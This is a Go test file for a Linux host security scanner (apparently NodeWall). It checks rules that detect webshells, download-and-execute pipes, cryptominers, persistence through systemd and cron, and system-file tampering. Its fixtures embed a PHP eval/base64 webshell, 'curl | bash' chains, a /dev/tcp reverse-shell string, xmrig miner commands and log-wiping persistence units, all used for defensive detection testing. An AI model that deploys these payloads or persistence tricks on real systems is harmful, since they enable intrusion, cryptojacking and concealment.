package securityscan

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestMergeProcessFindingsKeepsOneRowPerPID(t *testing.T) {
	findings := []Finding{{PID: 42, Rule: "hidden-process", Detail: "hidden"}}
	merged := mergeProcessFindings(findings, []Finding{{PID: 42, Rule: "high-cpu-process", CPUPercent: 245.5, Detail: "cpu"}, {PID: 43, Rule: "high-cpu-process", CPUPercent: 210}}, 10)
	if len(merged) != 2 {
		t.Fatalf("merged findings = %#v, want one row per PID", merged)
	}
	if merged[0].CPUPercent != 245.5 || !strings.Contains(merged[0].Detail, "245.5") {
		t.Fatalf("CPU evidence was not retained: %#v", merged[0])
	}
}

func TestUserSystemdUnitsAreScannedWithoutSystemWideMask(t *testing.T) {
	for _, path := range []string{"/home/alice/.config/systemd/user/updater.service", "/root/.config/systemd/user/updater.service", "/etc/systemd/user/updater.service"} {
		if !isSystemdUnitPath(path) || IsSystemdUnitPath(path) {
			t.Errorf("user unit incorrectly classified for system-wide masking: %s", path)
		}
	}
	if !IsSystemdUnitPath("/etc/systemd/system/updater.service") {
		t.Fatal("system unit no longer eligible for system-manager mask")
	}
}

func TestScanFindsBuiltInScriptIndicators(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "uploads", "shell.php")
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("<?php eval(base64_decode($_POST['x'])); ?>"), 0o644); err != nil {
		t.Fatal(err)
	}

	report, err := New().Scan(context.Background(), root, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(report.Findings) != 1 || report.Findings[0].Rule != "webshell" {
		t.Fatalf("unexpected findings: %#v", report.Findings)
	}
	if report.Findings[0].SHA256 == "" || report.FilesScanned != 1 {
		t.Fatalf("expected hash and file count: %#v", report)
	}
}

func TestScanProgressPublishesFileFindingsBeforeCompletion(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "uploads", "shell.php")
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("<?php eval(base64_decode($_POST['x'])); ?>"), 0o644); err != nil {
		t.Fatal(err)
	}

	var progress []Progress
	report, err := New().Scan(context.Background(), root, func(update Progress) {
		progress = append(progress, update)
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(report.Findings) != 1 {
		t.Fatalf("unexpected final findings: %#v", report.Findings)
	}
	for _, update := range progress {
		if update.Phase == "files" && update.FindingsReady && len(update.ProcessFindings) > 0 {
			if update.ProcessFindings[0].Rule != "webshell" {
				t.Fatalf("progress snapshot contained the wrong finding: %#v", update.ProcessFindings)
			}
			return
		}
	}
	t.Fatalf("file finding was only published in the terminal report: %#v", progress)
}

func TestOversizedFilesAreSkippedNotCountedAsScanned(t *testing.T) {
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "large.txt"), []byte(strings.Repeat("x", 100)), 0o600); err != nil {
		t.Fatal(err)
	}
	scanner := New()
	scanner.MaxFileSize = 10
	report, err := scanner.Scan(context.Background(), root, nil)
	if err != nil {
		t.Fatal(err)
	}
	if report.FilesScanned != 0 || report.FilesSkipped != 1 || report.ReadErrors != 0 || report.BytesScanned != 0 || !report.Truncated {
		t.Fatalf("oversized file was reported as checked: %#v", report)
	}
}

func TestScannerDetectsContentAfterFourMiBAndAcrossChunkBoundary(t *testing.T) {
	path := filepath.Join(t.TempDir(), "large.php")
	data := []byte(strings.Repeat(" ", 5<<20))
	copy(data[(4<<20)+(64<<10)-5:], "<?php eval(base64_decode($_POST['x'])); ?>")
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	report, err := New().Scan(context.Background(), path, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(report.Findings) != 1 || report.Findings[0].Rule != "webshell" || report.BytesScanned != uint64(len(data)) {
		t.Fatalf("file tail or chunk-boundary signature was missed: %#v", report)
	}
}

func TestOrdinaryDownloadAndServiceCommandsDoNotTriggerHighRisk(t *testing.T) {
	for _, sample := range []string{"curl -I https://example.invalid/health", "wget https://example.invalid/archive.tar.gz", "systemctl enable nginx", "LD_PRELOAD=/usr/lib/libexample.so program"} {
		if rule, _, _ := detect(sample, "/opt/admin.sh", 0o600); rule != "" {
			t.Errorf("ordinary command flagged: %q => %s", sample, rule)
		}
	}
	for _, sample := range []string{"curl https://example.invalid/install | bash", "wget -qO- https://example.invalid/install|sh", "echo aaa | base64 -d | bash"} {
		if rule, severity, _ := detect(sample, "/opt/admin.sh", 0o600); rule != "download-and-execute" || severity != SeverityHigh {
			t.Errorf("execution chain missed: %q => %s", sample, rule)
		}
	}
}

func TestPipeDetectionIgnoresRegexAlternatives(t *testing.T) {
	sample := `#!/bin/bash
excluded_mounts="/dev/loo|tmpfs|udev|overlay|shm|none"
curl -sS https://example.invalid/health
`
	if rule, _, _ := detect(sample, "/opt/monitor_disk.sh", 0o755); rule != "" {
		t.Fatalf("regex alternatives were treated as a shell pipe: %s", rule)
	}
	for _, sample := range []string{
		"curl https://example.invalid/install | bash",
		"wget -qO- https://example.invalid/install|/bin/sh",
	} {
		if rule, severity, _ := detect(sample, "/tmp/installer.sh", 0o700); rule != "download-and-execute" || severity != SeverityHigh {
			t.Fatalf("shell pipe was missed: %q => %s (%s)", sample, rule, severity)
		}
	}
}

func TestEmbeddedShellStringsInSystemBinariesDoNotTriggerTextRules(t *testing.T) {
	path := filepath.Join(t.TempDir(), "tool")
	data := append([]byte("\x7fELF"), []byte("curl https://example.invalid/install | bash /dev/tcp/127.0.0.1/4444")...)
	if err := os.WriteFile(path, data, 0o755); err != nil {
		t.Fatal(err)
	}
	report, err := New().Scan(context.Background(), path, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(report.Findings) != 0 {
		t.Fatalf("embedded strings in an ELF were treated as shell code: %#v", report.Findings)
	}
}

func TestBinaryMinerDetectionRequiresIndependentRuntimeEvidence(t *testing.T) {
	for name, sample := range map[string]string{
		"security-tool-help":          "\x7fELF god-eye detects xmrig minerd stratum+tcp:// pools and worker options",
		"protocol-without-miner-name": "\x7fELF stratum+tcp randomx hashrate",
		"generic-rpc-markers":         "\x7fELF xmrig stratum+tcp json_rpc getwork",
		"real-miner-signals":          "\x7fELF xmrig stratum+tcp randomx hashrate worker-id",
	} {
		path := filepath.Join(t.TempDir(), name)
		if err := os.WriteFile(path, []byte(sample), 0o755); err != nil {
			t.Fatal(err)
		}
		report, err := New().Scan(context.Background(), path, nil)
		if err != nil {
			t.Fatal(err)
		}
		if name != "real-miner-signals" && len(report.Findings) != 0 {
			t.Fatalf("%s caused a binary miner false positive: %#v", name, report.Findings)
		}
		if name == "real-miner-signals" && (len(report.Findings) != 1 || report.Findings[0].Rule != "cryptominer") {
			t.Fatalf("strong binary miner evidence was missed: %#v", report.Findings)
		}
	}
}

func TestTextMinerDetectionRequiresIndependentEvidence(t *testing.T) {
	// Scripts are eligible for automatic containment, so a marker copied from
	// help text or a generic pool client must not be sufficient on its own.
	for name, sample := range map[string]string{
		"name-only":            "#!/bin/sh\nxmrig --help\n",
		"protocol-only":        "#!/bin/sh\ncurl stratum+tcp://pool.example.invalid\n",
		"runtime-only":         "#!/bin/sh\necho randomx hashrate\n",
		"name-and-protocol":    "#!/bin/sh\nxmrig --url stratum+tcp://pool.example.invalid\n",
		"protocol-and-runtime": "#!/bin/sh\nstratum+tcp randomx hashrate\n",
	} {
		if rule, _, _ := detect(sample, "/opt/tool.sh", 0o755); rule != "" {
			t.Errorf("%s caused a text miner false positive: %s", name, rule)
		}
	}
	strong := "#!/bin/sh\nxmrig --url stratum+tcp://pool.example.invalid --algo randomx\n"
	if rule, severity, _ := detect(strong, "/opt/miner.sh", 0o755); rule != "cryptominer" || severity != SeverityHigh {
		t.Fatalf("strong text miner evidence was missed: %s (%s)", rule, severity)
	}
}

func TestTextIndicatorsRequireScriptContext(t *testing.T) {
	for _, sample := range []string{
		"README: run curl https://example.invalid/install | bash and enable crontab -e",
		"history: xmrig stratum+tcp randomx hashrate",
	} {
		if rule, _, _ := detect(sample, "/root/.bash_history", 0o600); rule != "" {
			t.Fatalf("non-script text was flagged: %q => %s", sample, rule)
		}
	}
	if rule, severity, _ := detect("curl https://example.invalid/install | bash", "/tmp/installer.sh", 0o600); rule != "download-and-execute" || severity != SeverityHigh {
		t.Fatalf("script indicator was missed: %s (%s)", rule, severity)
	}
}

func TestObservedBootPersistenceChainIsHighRisk(t *testing.T) {
	service := "[Service]\nExecStart=/usr/bin/7e4a91c0d2b84f16 random\nType=simple\n"
	if rule, severity, _ := detect(service, "/lib/systemd/system/a4f91c2e.service", 0o644); rule != "suspicious-startup" || severity != SeverityMedium {
		t.Fatalf("random startup executable was not retained as review evidence: %s (%s)", rule, severity)
	}
	persistent := "[Service]\nUser=root\nExecStart=/usr/bin/7e4a91c0d2b84f16 random\nRestart=always\nKillMode=process\n"
	if rule, severity, _ := detect(persistent, "/lib/systemd/system/5ddf18af.service", 0o644); rule != "malware-persistence" || severity != SeverityHigh {
		t.Fatalf("persistent random root service was not promoted to high risk: %s (%s)", rule, severity)
	}

	sample := "[Service]\nExecStart=/usr/bin/7e4a91c0d2b84f16 random\nmake -C /lib/modules/5.4.0/build M=/tmp/a modules\n/tmp/a/graphic_card.ko\nsudo journalctl --vacuum-time=1s\n"
	rule, severity, detail := detect(sample, "/lib/systemd/system/a4f91c2e.service", 0o644)
	if rule != "malware-persistence" || severity != SeverityHigh {
		t.Fatalf("boot persistence chain was missed: %s (%s)", rule, severity)
	}
	if !strings.Contains(detail, "unit=a4f91c2e.service") || !strings.Contains(detail, "ExecStart=/usr/bin/7e4a91c0d2b84f16") {
		t.Fatalf("startup chain did not retain unit provenance: %s", detail)
	}
	wrapped := "[Service]\nExecStart=/bin/sh /tmp/loader.sh\n"
	if rule, severity, _ := detect(wrapped, "/lib/systemd/system/q7m2x91k.service", 0o644); rule != "malware-persistence" || severity != SeverityHigh {
		t.Fatalf("shell-wrapped temporary payload was missed: %s (%s)", rule, severity)
	}
	if rule, severity, _ := detect(wrapped, "/lib/systemd/system/maintenance.service", 0o644); rule != "suspicious-startup" || severity != SeverityMedium {
		t.Fatalf("temporary payload in a normal-named unit was not retained as review evidence: %s (%s)", rule, severity)
	}
}

func TestGeneratedNamesDoNotControlPersistenceDetection(t *testing.T) {
	service := "[Service]\nExecStart=/bin/sh /var/tmp/.runtime/start-helper\ninsmod /var/tmp/.runtime/driver-renamed.ko\ntruncate -s 0 /var/log/messages\n"
	rule, severity, detail := detect(service, "/run/systemd/transient/maintenance.service", 0o644)
	if rule != "malware-persistence" || severity != SeverityHigh {
		t.Fatalf("generated payload and ordinary service name were missed: %s (%s) detail=%s", rule, severity, detail)
	}
}

func TestVendorSystemdServiceIsNotSuspiciousByItsStartupShape(t *testing.T) {
	service := "[Unit]\nDescription=Deferred execution scheduler\n[Service]\nExecStartPre=-find /var/spool/cron/atjobs -type f -delete\nExecStart=/usr/sbin/atd -f\nRestart=on-failure\n"
	if rule, _, _ := detect(service, "/lib/systemd/system/atd.service", 0o644); rule != "" {
		t.Fatalf("ordinary vendor service was flagged: %s", rule)
	}
}

func TestModprobeUnitIsNotClassifiedAsTemporaryPayload(t *testing.T) {
	service := "[Service]\nExecStart=/sbin/modprobe -q %i\n"
	if rule, _, _ := detect(service, "/lib/systemd/system/modprobe@.service", 0o644); rule != "" {
		t.Fatalf("ordinary modprobe unit was flagged: %s", rule)
	}
}

func TestRuntimeHelperUnderRunIsNotClassifiedAsTemporaryPayload(t *testing.T) {
	service := "[Service]\nExecStart=/run/lxd_config/9p/lxd-agent\n"
	if rule, _, _ := detect(service, "/lib/systemd/system/lxd-agent-9p.service", 0o644); rule != "" {
		t.Fatalf("ordinary /run helper was flagged: %s", rule)
	}
}

func TestE2scrubCronCheckIsNotClassifiedAsSuspiciousStartup(t *testing.T) {
	cron := "30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron\n"
	if rule, _, _ := detect(cron, "/etc/cron.d/e2scrub_all", 0o644); rule != "" {
		t.Fatalf("ordinary e2scrub cron check was flagged: %s", rule)
	}
}

func TestDockerRuntimeLogIsNotStartupConfiguration(t *testing.T) {
	path := "/var/lib/docker/containers/abcd/abcd-json.log"
	if isContainerStartupPath(path) || isStartupConfigurationPath(path) || !isDockerRuntimeLogPath(path) {
		t.Fatalf("docker runtime log was treated as startup configuration: %s", path)
	}
}

func TestSystemFileMutationIsDetectedWithoutRandomUnitName(t *testing.T) {
	service := "[Service]\nExecStart=/bin/sh -c 'rm -f /usr/sbin/iptables'\n"
	rule, severity, detail := detect(service, "/etc/systemd/system/firewall-maintenance.service", 0o644)
	if rule != "system-file-tamper" || severity != SeverityHigh {
		t.Fatalf("system-file mutation was missed: %s (%s)", rule, severity)
	}
	if !strings.Contains(detail, "protected system command") {
		t.Fatalf("system-file mutation detail was incomplete: %s", detail)
	}
}

func TestOrdinaryInitScriptRuntimeCleanupIsNotSystemFileTamper(t *testing.T) {
	script := "#!/bin/sh\nrm -f /var/run/example.pid\nmkdir -p /var/run/example\n"
	if rule, _, _ := detect(script, "/etc/init.d/example", 0o755); rule == "system-file-tamper" {
		t.Fatalf("ordinary init-script runtime cleanup was flagged as protected-file tamper")
	}
}

func TestVendorSSHInitScriptIsNotSystemFileTamper(t *testing.T) {
	script := `#!/bin/sh
SSHD=/usr/sbin/sshd
PID_FILE=/var/run/sshd.pid
/usr/bin/ssh-keygen -A
if [ -x /sbin/restorecon ]; then /sbin/restorecon /etc/ssh/ssh_host_rsa_key.pub; fi
rm -f /var/lock/subsys/sshd
`
	if rule, _, detail := detect(script, "/etc/init.d/ssh", 0o755); rule == "system-file-tamper" {
		t.Fatalf("vendor SSH init script was flagged as protected-file tamper: %s", detail)
	}
}

func TestVendorRsyncInitScriptIsNotSystemFileTamper(t *testing.T) {
	script := "#!/bin/sh\nDAEMON=/usr/bin/rsync\nPIDFILE=/var/run/rsyncd.pid\nrm -f \"$PIDFILE\"\n"
	if rule, _, detail := detect(script, "/etc/init.d/rsync", 0o755); rule == "system-file-tamper" {
		t.Fatalf("vendor rsync init script was flagged as protected-file tamper: %s", detail)
	}
}

func TestProtectedSecurityBinaryReplacementRemainsDetected(t *testing.T) {
	script := "#!/bin/sh\nrm -f /usr/sbin/iptables\n"
	rule, severity, _ := detect(script, "/etc/init.d/malicious-loader", 0o755)
	if rule != "system-file-tamper" || severity != SeverityHigh {
		t.Fatalf("protected security binary replacement was no longer detected: %s (%s)", rule, severity)
	}
}

func TestScheduledTemporaryPayloadIsDetectedWithoutMinerSignature(t *testing.T) {
	cron := "@reboot /var/tmp/boot-helper --quiet\n"
	rule, severity, _ := detect(cron, "/etc/cron.d/maintenance", 0o644)
	if rule != "suspicious-startup" || severity != SeverityHigh {
		t.Fatalf("temporary scheduled payload was missed: %s (%s)", rule, severity)
	}
}

func TestContainerHostMutationIsDetectedFromRuntimeMetadata(t *testing.T) {
	config := `{"Privileged":true,"Binds":["/:/host"],"Cmd":["sh","-c","rm -f /usr/sbin/iptables"]}`
	rule, severity, _ := detect(config, "/var/lib/docker/containers/abcd/config.v2.json", 0o600)
	if rule != "malware-persistence" || severity != SeverityHigh {
		t.Fatalf("container host mutation was missed: %s (%s)", rule, severity)
	}
}

func TestStartupLoaderIdentifiesUnitWriter(t *testing.T) {
	script := "#!/bin/sh\ncurl -fsSL https://example.invalid/payload -o /tmp/payload\ninstall -m 644 /tmp/payload.service /etc/systemd/system/c8e19a7b.service\nsystemctl daemon-reload\nsystemctl enable c8e19a7b.service\n"
	rule, severity, detail := detect(script, "/etc/init.d/update-helper", 0o755)
	if rule != "startup-loader" || severity != SeverityHigh {
		t.Fatalf("systemd unit writer was missed: %s (%s)", rule, severity)
	}
	if !strings.Contains(detail, "startup script writes") {
		t.Fatalf("startup writer detail was incomplete: %s", detail)
	}
}

func TestScheduledMinerDetectionCoversCronAndSystemdTimer(t *testing.T) {
	cron := "SHELL=/bin/sh\n*/5 * * * * root /var/tmp/xmrig --algo randomx --url stratum+ssl://pool.example.invalid\n"
	if rule, severity, _ := detect(cron, "/etc/cron.d/system-update", 0o644); rule != "scheduled-miner" || severity != SeverityHigh {
		t.Fatalf("cron miner was missed: %s (%s)", rule, severity)
	}
	timer := "[Unit]\nDescription=maintenance\n[Timer]\nOnBootSec=5min\n[Install]\nWantedBy=timers.target\n"
	if rule, _, _ := detect(timer, "/etc/systemd/system/maintenance.timer", 0o644); rule != "" {
		t.Fatalf("ordinary systemd timer was flagged: %s", rule)
	}
	service := "[Service]\nExecStart=/usr/bin/xmrig --algo randomx --url stratum+ssl://pool.example.invalid\n"
	if rule, severity, _ := detect(service, "/etc/systemd/system/maintenance.service", 0o644); rule != "scheduled-miner" || severity != SeverityHigh {
		t.Fatalf("systemd service miner was missed: %s (%s)", rule, severity)
	}
	descriptionOnly := "[Unit]\nDescription=inspect xmrig randomx stratum+ssl examples\n[Service]\nExecStart=/bin/true\n"
	if rule, _, _ := detect(descriptionOnly, "/etc/systemd/system/maintenance.service", 0o644); rule != "" {
		t.Fatalf("systemd description was treated as a miner command: %s", rule)
	}
	comment := "# example: xmrig --algo randomx --url stratum+ssl://pool.example.invalid\n"
	if rule, _, _ := detect(comment, "/opt/notes.txt", 0o600); rule != "" {
		t.Fatalf("non-scheduled example was flagged: %s", rule)
	}
}

func TestSystemFileFindingCarriesTamperEvidence(t *testing.T) {
	file, err := os.CreateTemp(t.TempDir(), "system-file-evidence-")
	if err != nil {
		t.Fatal(err)
	}
	defer file.Close()
	if _, err := file.Write(append([]byte{0x7f, 'E', 'L', 'F'}, []byte("xmrig stratum+ssl randomx")...)); err != nil {
		t.Fatal(err)
	}
	if _, err := file.Seek(0, 0); err != nil {
		t.Fatal(err)
	}
	report, err := New().ScanOpenFile(context.Background(), file, "/usr/bin/mysqld")
	if err != nil || len(report.Findings) != 1 {
		t.Fatalf("system-file evidence was not detected: %#v, %v", report, err)
	}
	if !report.Findings[0].SystemFile || !strings.Contains(report.Findings[0].Detail, "系统目录文件") {
		t.Fatalf("system-file tamper evidence was not marked: %#v", report.Findings[0])
	}
	if report.Findings[0].Quarantinable {
		t.Fatal("system-file evidence became automatically quarantinable")
	}
}

func TestSystemPathRulesRemainEvidenceOnly(t *testing.T) {
	if !isSystemPackageFile("/usr/bin/mysqld") || !isSystemPackageFile("/etc/cron.d/system-update") {
		t.Fatal("system paths were not recognized")
	}
	if isSystemPackageFile("/opt/application/bin/worker") {
		t.Fatal("application path was treated as a system path")
	}
}

func TestNodeWallQuarantineTreeIsTrusted(t *testing.T) {
	root := filepath.Join(t.TempDir(), "var", "lib", "nodewall", "quarantine")
	if !isNodeWallTrustedPath("/var/lib/nodewall/quarantine/scan-1/sample") {
		t.Fatal("NodeWall quarantine path is not trusted")
	}
	if isNodeWallArtifactPath("/tmp/quarantine/scan-1/sample") {
		t.Fatal("unrelated quarantine path was trusted")
	}
	_ = root
}

func TestAutomaticQuarantineCoversFindingsButProtectsNodeWall(t *testing.T) {
	root := filepath.Join("/tmp", "nodewall-quarantine-test-"+strings.ReplaceAll(t.Name(), "/", "-"))
	if err := os.MkdirAll(root, 0o700); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(root) })
	regular := filepath.Join(root, "history")
	if err := os.WriteFile(regular, []byte("xmrig stratum+tcp randomx hashrate"), 0o600); err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(regular)
	if err != nil {
		t.Fatal(err)
	}
	if quarantineEligible(regular, "cryptominer", info) {
		t.Fatal("non-executable history-like file was eligible for automatic quarantine")
	}
	executable := filepath.Join(root, "miner")
	if err := os.WriteFile(executable, []byte("payload"), 0o700); err != nil {
		t.Fatal(err)
	}
	info, err = os.Stat(executable)
	if err != nil {
		t.Fatal(err)
	}
	if !quarantineEligible(executable, "cryptominer", info) {
		t.Fatal("executable user-controlled file was not eligible for quarantine")
	}
	rootScript := "/tmp/auto_install.sh"
	if !quarantineEligible(rootScript, "loader-persistence", info) {
		t.Fatal("user-controlled loader was not eligible for quarantine")
	}
	doc := "/usr/share/doc/example/reverse.sh"
	if quarantineEligible(doc, "reverse-shell", info) {
		t.Fatal("system file finding was eligible for automatic quarantine")
	}
	if quarantineEligible(doc, "dangerous-command", info) {
		t.Fatal("medium evidence was eligible for automatic quarantine")
	}
	if quarantineEligible("/opt/nodewall/bin/nodewall", "cryptominer", info) || quarantineEligible(doc, "", info) {
		t.Fatal("NodeWall artifacts and empty rules must remain protected")
	}
	cronInfo := info
	if !quarantineEligible("/var/spool/cron/root", "scheduled-miner", cronInfo) {
		t.Fatal("user crontab miner was not eligible for automatic isolation")
	}
	dir, err := os.Stat(root)
	if err != nil || quarantineEligible(root, "cryptominer", dir) {
		t.Fatal("directories must not be eligible for isolation")
	}
}

func TestNodeWallArtifactsAreSkipped(t *testing.T) {
	root := filepath.Join("/tmp", "nodewall-scanner-test-"+strings.ReplaceAll(t.Name(), "/", "-"))
	if err := os.MkdirAll(root, 0o700); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(root) })
	artifact := filepath.Join(root, "nodewall_0.1.0_linux_amd64.tar.gz")
	if err := os.WriteFile(artifact, []byte("eval(base64_decode($_POST['x']))"), 0o600); err != nil {
		t.Fatal(err)
	}
	report, err := New().Scan(context.Background(), root, nil)
	if err != nil {
		t.Fatal(err)
	}
	if report.FilesScanned != 0 || report.FilesSkipped != 1 || len(report.Findings) != 0 {
		t.Fatalf("NodeWall package was not excluded: %#v", report)
	}
}

func TestNodeWallStagingBinaryIsSkipped(t *testing.T) {
	root := filepath.Join("/tmp", "nodewall-rebuilt-test-"+strings.ReplaceAll(t.Name(), "/", "-"), "nodewall_0.1.0_linux_amd64", "bin")
	if err := os.MkdirAll(root, 0o700); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(filepath.Dir(filepath.Dir(root))) })
	path := filepath.Join(root, "nodewall")
	if err := os.WriteFile(path, []byte("\x7fELF xmrig stratum+tcp randomx hashrate worker-id"), 0o755); err != nil {
		t.Fatal(err)
	}
	report, err := New().Scan(context.Background(), filepath.Dir(filepath.Dir(root)), nil)
	if err != nil {
		t.Fatal(err)
	}
	if report.FilesScanned != 0 || report.FilesSkipped != 1 || len(report.Findings) != 0 {
		t.Fatalf("NodeWall staging binary was not excluded: %#v", report)
	}
}

func TestNodeWallDeploymentStagingArtifactsAreRecognized(t *testing.T) {
	for _, path := range []string{
		"/opt/nodewall-update-scanfix6/nodewall.new",
		"/opt/nodewall-update-scanfix6/nodewall_0.1.0_linux_amd64/bin/nodewall",
		"/tmp/nodewall-rebuilt/nodewall_0.1.0_linux_amd64/bin/nodewall",
	} {
		if !isNodeWallBuildBinaryPath(path) {
			t.Errorf("NodeWall staging artifact was not recognized: %s", path)
		}
	}
	for _, path := range []string{
		"/opt/nodewall-update-scanfix6/notes.txt",
		"/opt/nodewall-update-scanfix6/nodewall.new.bak",
		"/opt/third-party/nodewall",
		"/usr/local/bin/nodewall",
	} {
		if isNodeWallBuildBinaryPath(path) {
			t.Errorf("unrelated path was recognized as a NodeWall staging artifact: %s", path)
		}
	}
}

func TestNormalizeDeletedExecutablePathHandlesOverlayMarkers(t *testing.T) {
	for _, test := range []struct {
		input string
		want  string
	}{
		{input: "/usr/lib/systemd/systemd-journald (deleted)", want: "/usr/lib/systemd/systemd-journald"},
		{input: "/usr/lib/systemd/systemd-journald;6af13621 (deleted)", want: "/usr/lib/systemd/systemd-journald"},
		{input: "/tmp/service;name (deleted)", want: "/tmp/service;name"},
	} {
		got, deleted := normalizeDeletedExecutablePath(test.input)
		if !deleted || got != test.want {
			t.Errorf("normalizeDeletedExecutablePath(%q) = %q, %t; want %q, true", test.input, got, deleted, test.want)
		}
	}
}

func TestDeletedNodeWallExecutableIsTrusted(t *testing.T) {
	for _, path := range []string{
		"/opt/nodewall/bin/nodewall (deleted)",
		"/opt/nodewall/bin/nodewall;6af13621 (deleted)",
		"/etc/nodewall/nodewall.env (deleted)",
		"/var/lib/nodewall/scan-reports/scan.json (deleted)",
	} {
		if !isNodeWallTrustedPath(path) {
			t.Errorf("deleted NodeWall path was not trusted: %s", path)
		}
	}
}

func TestReadErrorsAndCancellationDoNotReportCompleteCoverage(t *testing.T) {
	root := t.TempDir()
	for _, name := range []string{"a.txt", "z.txt"} {
		if err := os.WriteFile(filepath.Join(root, name), []byte("benign"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	report, err := New().Scan(context.Background(), root, func(p Progress) {
		if p.FilesScanned == 1 {
			_ = os.Remove(filepath.Join(root, "z.txt"))
		}
	})
	if err != nil || report.ReadErrors != 1 || report.FilesScanned != 1 || !report.Truncated {
		t.Fatalf("read error was hidden: %#v %v", report, err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := New().Scan(ctx, root, nil); err == nil {
		t.Fatal("cancellation ignored")
	}
}

func TestScanSkipsVirtualSystemDirectoriesWhenScanningRoot(t *testing.T) {
	if _, err := ValidateRoot("relative/path"); err == nil {
		t.Fatal("expected relative path to be rejected")
	}
	if _, err := ValidateRoot("/path/that/does/not/exist"); err == nil {
		t.Fatal("expected missing path to be rejected")
	}
}

func TestContainerStorageIsReservedForExplicitScans(t *testing.T) {
	for _, path := range []string{
		"/var/lib/docker",
		"/var/lib/docker/aufs/diff",
		"/var/lib/containerd",
		"/var/lib/kubelet",
		"/var/lib/rancher",
	} {
		if !isContainerStorageDirectory(path) {
			t.Errorf("container storage path was not recognized: %s", path)
		}
	}
	for _, path := range []string{"/var/lib/nodewall", "/var/lib/postgresql", "/srv/app"} {
		if isContainerStorageDirectory(path) {
			t.Errorf("unrelated path was treated as container storage: %s", path)
		}
	}
}

func TestExplicitSymlinkRootResolvesToScannedTarget(t *testing.T) {
	root := t.TempDir()
	target := filepath.Join(root, "shell.php")
	if err := os.WriteFile(target, []byte("<?php eval(base64_decode($_POST['x'])); ?>"), 0o600); err != nil {
		t.Fatal(err)
	}
	alias := filepath.Join(root, "alias.php")
	if err := os.Symlink(target, alias); err != nil {
		t.Fatal(err)
	}
	report, err := New().Scan(context.Background(), alias, nil)
	if err != nil || report.FilesScanned != 1 || len(report.Findings) != 1 {
		t.Fatalf("explicit symlink target was silently skipped: %#v %v", report, err)
	}
}
